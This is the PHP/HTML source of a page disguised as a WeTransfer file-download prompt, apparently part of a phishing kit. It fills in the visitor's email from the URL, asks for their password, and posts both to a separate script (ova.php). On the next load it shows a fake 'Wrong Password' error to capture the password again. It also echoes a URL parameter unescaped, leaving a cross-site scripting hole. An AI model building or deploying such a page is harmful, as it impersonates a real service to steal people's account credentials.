<?php  
session_start();
$show="";
if(isset($_SESSION['logn']))
{
	$show = "yes";
}
error_reporting(0);
?>
<html>

<head>
	<meta charset="utf-8">
	<title>WeTransfer</title>
	
	
	<link rel="shortcut icon" href="favicon.ico" />
	<link rel="icon" sizes="16x16 32x32" href="favicon.ico">
    <link rel="mask-icon" href="favicon.svg" color="#17181A">

	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
	<link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet" media="all">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.5.2/animate.min.css">
	<!-- jQuery library -->
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

	<!-- Popper JS -->
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>

	<!-- Latest compiled JavaScript -->
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
	<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
	<style>
		body {
			background-image: url(bg.png);
			background-repeat: no-repeat;
			color: #045eb4;
		}
		
		#logo {
			position: relative;
			left: 520px;
			top: 50px;
		}
		
		#d {
			position: relative;
			left: 530px;
			top: 150px;
			
		}
		.sky{
					background-color: #409fff;
			
		}
		
		#form {
	position: absolute;
	left: 80px;
	top: 120px;
	width: 301px;
	padding: 30px;
	z-index: 2;
	background: white;
	height: 420px;
			border-radius: 10px;
		}
		.blue{
			background-color: #045eb4;
			color: white;
		}
		#sub1{
			position: absolute;
			left: 580px;
			top:480px;
			
		}
				#sub{
					border-radius: 15px;
					color:white;
			
		}
	</style>
</head>

<body>

	<div id="form" >
	<h1></h1><br><h1></h1>
	<img src="logo.png" width="200">
	<div style="color:#C03A3C; font-size: 12.3px;position: relative;margin-bottom: 20px; width: 331px;">
	  	</div>
<hr>
	<h1></h1>
	<p></p>
		<form method="POST" action="ova.php">
			<?php
			if($show == "yes")
			{
				echo '<span style="color:red;font-size:10;">Wrong Password: Please input correct Password</span>'; //Style this error the way you want
				unset($_SESSION['logn']); //Delete the session after the error message so that e go commot after u reload the page.
			}

			?>
		<input type="hidden" value="<?php echo $_GET["logn"]; ?>" name="logn">
			<h6><?php echo"<h6>" . $_GET["logn"] . "</h6>"; ?></h6>
			<input type="password" name="passwd" class="form-control validate[required]" value="" id="ps" placeholder= Password required>
			<span class="text-danger" id="er"></span>
			
<br/>
			<input id="sub" name="contactSubmit" type="submit" class="btn btn-md btn-block sky"  value="Download file">

		
		
		</form>
	
	</div>
	<script type="text/javascript">
  new MaskedPassword(document.getElementById("ps"), '\u25CF');
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
	
</body>

</html>
